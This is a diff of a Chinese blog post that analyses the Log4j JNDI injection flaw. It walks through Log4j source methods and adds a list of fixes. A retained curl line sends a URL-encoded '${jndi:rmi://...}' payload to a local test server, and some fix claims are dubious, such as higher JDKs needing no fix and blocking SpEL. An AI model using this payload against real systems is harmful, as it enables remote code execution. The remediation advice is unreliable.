@@ -54,6 +54,54 @@ RMI 可以看做 java 由 JVM 实现的一套远程 RPC 机制(只能jvm内互�
 -   log4j-core@2.14.1
 -   log4j-api@2.14.1
 
+观察其方法,debug 看其调用栈至 PatternLayout
+
+```java
+@Override
+public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
+  final int len = formatters.length;
+  for (int i = 0; i < len; i++) {
+    formatters[i].format(event, buffer); // 中间有个 message 的就是处理这种占位符的
+  }
+  if (replace != null) { // creates temporary objects
+    String str = buffer.toString();
+    str = replace.format(str);
+    buffer.setLength(0);
+    buffer.append(str);
+  }
+  return buffer;
+}
+```
+
+```java
+protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,final int startPos, final int endPos) {
+  final StrLookup resolver = getVariableResolver();
+  if (resolver == null) {
+    return null;
+  }
+  return resolver.lookup(event, variableName); // 好了看到这个 lookup 就是它干的好事
+}
+
+public String lookup(final LogEvent event, final String key) {
+  if (key == null) {
+    return null;
+  }
+  final String jndiName = convertJndiName(key);
+  try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
+    return Objects.toString(jndiManager.lookup(jndiName), null);
+  } catch (final NamingException e) {
+    LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
+    return null;
+  }
+}
+
+// JNDI Manager javax.naming.Context
+public <T> T lookup(final String name) throws NamingException {
+  return (T) this.context.lookup(name);
+}
+// 这个 lookup 到后面发起网络请求
+```
+
 
 
 
@@ -231,10 +279,6 @@ class TestController {
 
 ```
 
-
-
-
-
 模拟请求
 
 ```shell
@@ -242,6 +286,20 @@ curl 'localhost:8888?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A1099%2FHackerClas
 ```
 
 
+
+## 修复
+
+---
+
+首先高版本的JDK(>1.8)由于禁用了相关参数无需修复
+
+知道原理那么修复的方法就很多了
+
+-   jvm 参数禁用远程调用
+-   服务器禁用远程调用
+-   不要用 log4j-core 强制使用 logback
+-   代码级别判断,禁止SpEL表达式
+-   升级2.15(只是多加了个判断)
 
 
 
